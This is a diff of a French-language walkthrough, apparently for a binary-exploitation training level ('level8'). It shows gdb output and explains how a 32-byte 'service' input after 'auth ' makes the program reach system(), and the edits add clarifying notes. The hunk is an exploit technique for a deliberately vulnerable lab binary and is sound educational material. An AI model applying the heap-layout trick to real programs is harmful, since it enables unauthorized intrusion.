@@ -212,7 +212,7 @@ On peux comprendre alors qu'il contient plusieurs comparaison de variables assoc
   (...)
   0x080486bb <+343>:   mov    $0x804882d,%eax
   
-  (gdb) x/s 0x8048819
+  (gdb) x/s 0x8048819 134514713 134514725
   0x8048819:	 "auth "
   (gdb) x/s 0x804881f
   0x804881f:	 "reset"
@@ -222,14 +222,14 @@ On peux comprendre alors qu'il contient plusieurs comparaison de variables assoc
   0x804882d:	 "login"
 ```
 
-On peux de ce fait, comprendre que lorsque qu'un `reset` est envoyé en input, il utilise la fonction `free()` (+271), mais surtout que surtout qu'on peux atteindre la fonction `system()` (+401) en appelant la variable `login` en position auth+32 bytes, ce qui peux se résoudre par un appel à la variable `service` assez long pour atteindre 32 bytes:
+On peux de ce fait, comprendre que lorsque qu'un `reset` est envoyé en input, il utilise la fonction `free()` (+271), mais surtout que surtout qu'on peux atteindre la fonction `system()` (+401) en appelant la variable `login` en position 0x804882d (+32 bytes), ce qui peux se résoudre par un appel à la variable `service` assez long pour atteindre 32 bytes:
 
 > service0123456789qwerty (16bytes + 16bytes)
 
 ```
 :~$ ./level8
 (nil), (nil)
-(input) auth 
+(input) auth  // ne pas oublier l'espace "auth "
 0x804a008, (nil)
 (input) service0123456789qwerty
 0x804a008, 0x804a028
